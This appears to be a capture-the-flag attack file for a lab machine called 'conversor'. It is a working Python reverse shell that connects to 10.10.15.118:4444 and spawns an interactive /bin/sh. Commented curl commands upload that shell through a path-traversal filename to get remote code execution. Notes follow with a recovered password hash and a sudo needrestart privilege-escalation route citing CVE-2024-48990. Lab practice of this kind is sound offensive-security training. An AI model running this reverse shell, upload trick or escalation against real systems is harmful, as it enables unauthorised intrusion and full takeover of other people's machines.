import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.15.118",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

# Create an account and login
#curl --data "username=veio&password=veio" --dump-header headers -c cookies http://conversor.htb/
# Check cookies are set correctly
#curl -H headers -b cookies http://conversor.htb
# Upload file for RCE
#curl -X POST  -F "xml_file=@reverse.py;filename=../scripts/reverse.py" -F "xslt_file=@nmap.xslt" -H headers -b cookies http://conversor.htb/convert
# Copy users.db to /static, download and get password hash for user "fismathack", 5b5c3ac3a1c897c94caad48e6c71fdec

notes = """
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart

"""

User has sudo on needrestart, this can allow you to read the root.txt flag. CVE-2024-48990 could also give full PE
